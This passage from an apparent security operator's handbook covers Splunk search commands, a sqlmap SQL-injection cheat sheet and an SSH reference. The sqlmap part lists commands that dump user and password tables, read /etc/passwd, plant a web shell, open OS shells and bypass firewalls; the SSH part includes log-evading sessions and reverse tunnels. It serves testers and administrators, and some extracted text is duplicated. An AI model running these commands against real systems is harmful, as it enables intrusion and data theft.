* Fatal | rex "(?i) msg=(?P[^,]+)" 
rex is for extracting a 
pattern and storing it as a 
new field. 
* | regex _raw=".*Fatal.*" 
regex is like grep and can 
use regular expressions 
against output results.. 
ORDER RESULTS 
Sort, re-order, or return a 
portion of a search result 
set.  
* | sort ip, -url  
Sort results by ip value in 
ascending order and then by 
url value in descending 
order.  
* | reverse 
Reverse the order of a 
result set.  
* | head 20 
Return the first 20 results.  
282 
* | tail 20 
Return the last 20 results 
(in reverse order).  
* | head 1000 | top 50 method 
Return first 1000 lines of 
log file and order top 50 
results. 
GROUP RESULTS 
Group search results into a 
transaction (a single 
observation of any event 
stretching over multiple 
logged events) based on 
related pieces of 
information, or group 
results by statistical 
correlation.  
* | transaction 
fields="host,cookie" maxspan=30s 
maxpause=5s 
Group search results that 
have the same host and 
cookie, occur within 30 
seconds of each other, and 
do not have a pause greater 
than 5 seconds between each 
event into a transaction.   
* | transaction fields=from 
maxspan=30s maxpause=5s 
Group search results that 
share the same value of 
from, with a maximum span of 
30 seconds, and a pause 
between events no greater 
than 5 seconds into a 
transaction. 
* | kmeans k=4 date_hour 
date_minute 
Group search results into 4 
clusters based on the values 
of the date_hour and 
date_minute fields.                    
* | cluster t=0.9 showcount=true | 
sort -cluster_count | head 20}}|| 
Cluster events together, 
sort them by their 
cluster_count values, and 
then return the 20 largest  
CLASSIFY EVENTS 
Classify events as a type 
(event type), or have Splunk 
automatically classify 
events.  
* | typer 
Force Splunk to apply event 
types that you have 
configured (Splunk Web 
automatically does this when 
you view the eventtype 
field).  
error | typelearner 
Have Splunk automatically 
discover and apply event 
types to events that contain 
the string "error".  
283 
CHANGE DISPLAY FORMATTING 
Generate search results from 
your data using commands 
other than search. You must 
use a pipe ( | ) before any 
data-generating command that 
isn't the search command. 
| inputcsv all.csv | search error 
| outputcsv errors.csv 
Read in results from the CSV 
file: 
$SPLUNK_HOME/var/run/splunk/
all.csv, keep any that 
contain the file: 
$SPLUNK_HOME/var/run/splunk/
error.csv  
| file /var/log/messages.1 
Display events from the file 
messages.1 as if the events 
were indexed in Splunk.  
| savedsearch mysecurityquery AND 
_count > 0 or | sendemail 
to=PI:EMAIL  
Run the mysecurityquery 
saved search, and email any 
results to user@domain.com.  
REPORTING 
Summarize the results of any 
search as a report by 
performing statistical 
operations, and graphing 
functions. 
* | rare url 
Return the least common 
values of the url field.  
* | top limit=20 url 
Return the 20 most common 
values of the url field.  
* | stats dc(host) 
Remove duplicates of results 
with the same host value and 
return the total count of 
the remaining results.   
* | stats avg(*lay) BY date_hour 
Return the average for each 
hour, of any unique field 
that ends with the string 
"lay" (for example, delay, 
xdelay, relay, etc). 
sourcetype=access_combined | top 
limit=100 referer_domain | stats 
sum(count) 
Search the access logs, and 
return the number of hits 
from the top 100 values of 
referer_domain.  
sourcetype=access_combined | 
associate supcnt=3 
Search the access logs, and 
return the results 
associated with each other 
(that have at least 3 
references to each other). 
* | chart avg(size) by host 
Return the average (mean) 
size for each distinct host.  
* | chart max(delay) by size 
bins=10 
Return the the maximum delay 
by size, where size is 
284 
broken down into a maximum 
of 10 equal sized buckets. 
* | timechart span=5m avg(thruput) 
by host 
Graph the average thruput of 
hosts over time.  
* | timechart avg(cpu_seconds) by 
host | outlier action=TR 
Create a timechart of 
average cpu_seconds by host, 
and remove data (outlying 
values) that may distort the 
timechart's axis. 
sourcetype=ps | multikv | 
timechart span=1m avg(CPU) by host 
Search for all ps events, 
extract values, and 
calculate the average value 
of CPU each minute for each 
host. 
sourcetype=web | timechart count 
by host | fillnull value=NULL 
Create a timechart of the 
count of from web sources by 
host, and fill all null 
values with "NULL". 
* | contingency datafield1 
datafield2 maxrows=5 maxcols=5 
usetotal=F 
Build a contingency table of 
datafields from all events.  
* | correlate type=cocur 
Calculate the co-occurrence 
correlation between all 
fields.  
* | addtotals fieldname=sum 
Calculate the sums of the 
numeric fields of each 
result, and put the sums in 
the field sum.  
* | anomalousvalue action=filter 
pthresh=0.02 
Return events with uncommon 
values.     
* | bucket size bins=10 | stats 
count(_raw) by size 
Bucket search results into 
10 bins, and return the 
count of raw events for each 
bucket.  
* | bucket _time span=5m | stats 
avg(thruput) by=_time host 
Return the average thruput 
of each host for each 5 
minute time span.  
* | stats sum() as result | 
eval result=(result/1000) 
Sum up a field and do some 
arithmetics: 
* | eval raw_len=len(_raw) | stats 
avg(raw_len), p10(raw_len), 
p90(raw_len) by sourcetype 
Determine the size of log 
events by checking len() of 
_raw. The p10() and p90() 
functions are returning the 
10 and 90 percentiles: 
* | correlate type=cocur 
Calculate the co-occurrence 
correlation between all 
fields. 
* | addtotals fieldname=sum 
Calculate the sums of the 
numeric fields of each 
285 
result, and put the sums in 
the field sum.  
sourcetype=ps | multikv | 
timechart span=1m avg(CPU) by host 
Search for all ps events, 
extract values, and 
calculate the average value 
of CPU each sourcetype=ps | 
multikv | timechart span=1m 
avg(CPU) by hostminute for 
each host. 
ADMINISTRATIVE 
Perform administration tasks 
using search commands. Crawl 
your servers to discover 
more data to index, view 
configuration settings, or 
see audit information. 
| crawl root="/;/Users/" | input 
add 
Crawl root and home 
directories and add all 
possible inputs found (adds 
configuration information to 
inputs.conf).  
| admin props 
View processing properties 
stored in props.conf - time 
zones, breaking characters, 
etc.  
index=audit | audit  
View audit trail information 
stored in the local audit 
index. Also decrypt signed 
audit events while checking 
for gaps and tampering. 
 | eventcount summarize=false 
index=* | dedup index | fields 
index 
List all Indices 
 | eventcount summarize=false 
report_size=true index=* | eval 
size_MB = 
round(size_bytes/1024/1024,2) 
List all Indices of a 
certain size. 
SUBSEARCH 
Use subsearches to use 
search results as an 
argument to filter search 
result sets with more 
granularity. 
* | set diff [search 404 | fields 
url] [search 303 | fields url] 
Return values of URL that 
contain the string "404" or 
"303" but not both.  
login root | localize maxspan=5m 
maxpause=5m | map search="search 
failure 
starttimeu=$starttime$ endtimeu=$e
ndtime$" 
Search for events around 
events associated with 
"root" and "login", and then 
search each of those time 
ranges for "failure".     
286 
[* | fields + source, sourcetype, 
host | format ] 
Create a search string from 
the values of the host, 
source and sourcetype 
fields.  
EMAIL RESULTS 
... | sendemail 
to="PI:EMAIL" 
By appending "sendemail" to 
any query you get the result 
by mail! 
Uncoder: One common language for cyber security 
https://uncoder.io/ 
Uncoder.IO is the online translator for SIEM saved searches, 
filters, queries, API requests, correlation and Sigma rules to help 
SOC Analysts, Threat Hunters and SIEM Engineers. Easy, fast and 
private UI you can translate the queries from one tool to another 
without a need to access to SIEM environment and in a matter of 
just few seconds. 
Uncoder.IO supports rules based on Sigma, ArcSight, Azure Sentinel, 
Elasticsearch, Graylog, Kibana, LogPoint, QRadar, Qualys, RSA 
NetWitness, Regex Grep, Splunk, Sumo Logic, Windows Defender ATP, 
Windows PowerShell, X-Pack Watcher. 
REFERENCE: 
https://gosplunk.com/ 
https://wiki.splunk.com/images/2/2b/Cheatsheet.pdf 
S
S 
SQLMAP 
RED TEAM 
EXPLOITATION 
WEB/DATABASE 
sqlmap is an open source penetration testing tool that automates 
the process of detecting and exploiting SQL injection flaws and 
taking over of database servers. 
Simple mapping option 
sqlmap -u "http://example.com/login.php" 
Use TOR SOCKS5 Proxy 
sqlmap -u "http://example.com/login.php" --tor --tor-type=SOCKS5 
Manually set the return time 
sqlmap -u "http://example.com/login.php" --time-sec 15 
List all databases located at target site 
sqlmap -u "http://example.com/login.php" --dbs 
List all tables in a database: 
287 
sqlmap -u "http://example.com/login.php" -D site_db --tables 
Use authentication cookie: 
sqlmap -u "http://example.com/login.php" --data="id=1&str=val" -p 
"pid" -b --cookie="cookie1=;cookie2=" 
--random-agent --risk 3 --level 5  
Use credentials to dump database table: 
sqlmap -u "http://example.com/login.php" –method "POST" –data 
"username=user&password=user&submit=Submit" -D database_name -T 
users –dump 
Dump only selected columns 
sqlmap -u "http://example.com/login.php" -D site_db -T users -C 
username,password --dump 
List all columns in a table 
sqlmap -u "http://example.com/login.php" -D database_name -T users 
--columns 
Dump database table content: 
sqlmap -u "http://example.com/login.php" -D database_name -T users 
–dump 
Use SQLMap OS Shell: 
sqlmap --dbms=mysql -u "http://example.com/login.php" --os-shell 
Use SQLMap SQL Shell: 
sqlmap --dbms=mysql -u "http://example.com/login.php" --sql-shell 
Dump all 
sqlmap -u http://example.com/Less-1/?id=1 -D database_name -T 
table_name --dump-all 
Checking Privileges 
sqlmap -u http://example.com/Less-1/?id=1 --privileges | grep FILE 
Reading file 
sqlmap -u  --file-read= 
sqlmap -u http://localhost/Less-1/?id=1 --file-read=/etc/passwd 
Writing file 
sqlmap -u  --file-write= --file-dest= 
288 
sqlmap -u http://example.com/Less-1/?id=1 --file-write=shell.php --
file-dest=/var/www/html/shell-php.php 
POST 
sqlmap -u  --data=" " 
sqlmap -u http://example.com/Less-11/ --data 
"uname=teste&passwd=&submit=Submit" -p uname 
You can also use a file like with the post request: 
./sqlmap.py -r post-request.txt -p uname 
Launch all tamper scripts at once: 
sqlmap -u 'http://www.example.com:80/search.cmd?form_state=1’ --
level=5 --risk=3 -p 'item1' --
tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64enc
ode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,
concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnu
ll2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiples
paces,nonrecursivereplacement,percentage,randomcase,randomcomments,
securesphere,space2comment,space2dash,space2hash,space2morehash,spa
ce2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,spac
e2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,
versionedkeywords,versionedmorekeywords 
REFERENCE: 
https://github.com/coreb1t/awesome-pentest-cheat-
sheets/blob/master/docs/sqlmap-cheatsheet-1.0-SDB.pdf 
https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-
bypass/423 
S
S 
SSH 
ALL 
ADMINISTRATION 
WINDOWS/LINUX/MacOS 
BASIC 
COMMAND 
DESCRIPTION 
sshpass -p '' ssh 
@, brew install 
sshpass 
ssh without input 
password 
apt-get install openssh, apt-get install 
openssh-server 
Install sshd server 
service sshd restart, systemctl reload 
sshd.service 
Restart sshd server 
ssh -o StrictHostKeyChecking=no -p 2702 
root@172.17.0.8 date 
Run ssh command 
289 
ssh -vvv -p 2702 PI:EMAIL date 
2>&1 
ssh with verbose 
output 
sshuttle -r PI:EMAIL 30.0.0.0/16 
192.168.150.0/24 -e ... 
Setup ssh tunnel for 
your web browsing 
ssh-copy-id @, Or 
manually update ~/.ssh/authorized_keys 
SSH passwordless login 
ssh-keygen -f ~/.ssh/known_hosts -R 
github.com 
Remove an entry from 
known_hosts file 
diff local_file.txt @ 'cat 
remote_file.txt') 
Diff local file with 
remote one 
diff :/root/ 
Upload with 
timestamps/permissions 
kept 
exec ssh-agent bash && ssh-add 
/tmp/id_rsa, ssh-add 
SSH agent load key 
ssh-add -l 
SSH list all loaded 
key 
exec ssh-agent bash && ssh-keygen, ssh-
add 
SSH agent create and 
load key 
emacs 
/ssh:@:/path/to/file 
Emacs read remote file 
with tramp 
ssh-keygen, ssh-keygen -C 
"PI:EMAIL" -t rsa 
Generate a new key 
pair 
ssh-keygen -t rsa -f /tmp/sshkey -N "" -
q 
Generate key pair 
without interaction 
ADVANCED 
ssh-keygen -p -f id_rsa 
Add passphrase 
protection to ssh 
keyfile 
ssh -o IdentitiesOnly=yes -i id1.key 
PI:EMAIL 
configure SSH to avoid 
trying all identity 
files 
ssh-keygen -f my_ssh.pub -i 
Convert OpenSSL format 
to SSH-RSA format 
~/.ssh/authorized_keys, ~/.ssh/config, 
~/.ssh/known_hosts 
Critical ssh 
files/folders 
/etc/ssh/ssh_config, 
/etc/ssh/sshd_config 
SSH config file 
chmod 600 ~/.ssh/id_rsa 
SSH key file 
permission 
chmod 700 ~/.ssh, chown -R $USER:$USER 
~/.ssh 
SSH folder permission 
chmod 644 ~/.ssh/authorized_keys 
Authorized_keys file 
permission 
ssh -o LogLevel=error 
Mute Warning: 
Permanently added 
290 
TUNNELING/PROXY 
ssh -N -i  -f 
PI:EMAIL -L 
*:18085:localhost:8085 -n /bin/bash 
SSH port forward to a 
local port 
ssh -o UserKnownHostsFile=/dev/null -T 
PI:EMAIL "bash -i" 
No logs created in 
/var/log/utmp or bash 
profiles 
ssh -g -L31337:1.2.3.4:80 PI:EMAIL 
SSH Tunnel OUT 
ssh -o ExitOnForwardFailure=yes -g -
R31338:192.168.0.5:80 PI:EMAIL 
SSH Tunnel IN 
ssh -g -R 1080 PI:EMAIL 
SSH socks4/5 IN, 
access local network 
through proxy 
ssh -D 1080 PI:EMAIL 
SSH socks4/5 OUT, 
revserse dynamic 
forwarding 
ssh -R *:40099:localhost:22 
PI:EMAIL, ssh -p 40099 
PI:EMAIL 
Reverse port forward 
to remote server 
sshuttle -r PI:EMAIL 30.0.0.0/16 
192.168.111.0/24 192.168.150.0/24 
192.167.0.0/24 
Setup SSH tunnel for 
your web browsing 
SECURITY 
sed -i 's/PasswordAuthentication 
yes/PasswordAuthentication no/g' 
/etc/ssh/sshd_config 
Disable SSH by 
password 
sed -i 's/^PermitRootLogin 
yes/#PermitRootLogin yes/' 
/etc/ssh/sshd_config 
Disable root login 
StrictHostKeyChecking yes change 
~/.ssh/config 
Enable/Disable SSH 
Host Key Checking 
fail2ban command line tool 
Protect SSH server 
from brute force 
attacks 
SCP 
scp -r ec2-user@:/home/letsencrypt-20180825 ./ 
Download a remote 
folder 
scp -i  /tmp/hosts ec2-
user@:/root/ 
Upload a file 
scp -r /tmp/abc/ ec2-user@:/root/ 
Upload a folder 
scp -rp /tmp/abc/ ec2-user@:/root/ 
Upload with 
timestamps/permissions 
kept 
sshfs name@server:/path/remote_folder 
/path/local_folder 
Mount remote directory 
as local folder 
SSH LOGS 
grep -R "ssh.*Received signal 15" 
/var/log/auth.log 
Events of SSH down 
291 
grep -R "sshd.*Server listening" 
/var/log/auth.log 
Events of SSH up 
grep -R "sshd.*Failed password for 
invalid user" /var/log/auth.log 
Events of SSH failed 
login 
grep -R "sshd.*POSSIBLE BREAK-IN 
ATTEMPT!" /var/log/auth.log 
Events of SSH break-in 
attempt 
grep -R "sshd.*Bad protocol version 
identification" /var/log/auth.log 
Events of SSH port 
scap 
grep -R "sshd.*Accepted publickey for" 
/var/log/auth.log 
Events of SSH login by 
public key 
grep -R "sshd.*Accepted password for" 
/var/log/auth.log 
Events of ssh login by 
password 
grep -R "sshd.*pam_unix(sshd:session): 
session closed for" /var/log/auth.log 
Events of ssh logout 
event 
SSH TOOLS 
ngrok.com 
Export local env to 
Internet 
sshuttle 
Reverse ssh proxy 
sshpass sshpass -p “$PASSWORD” ssh -o 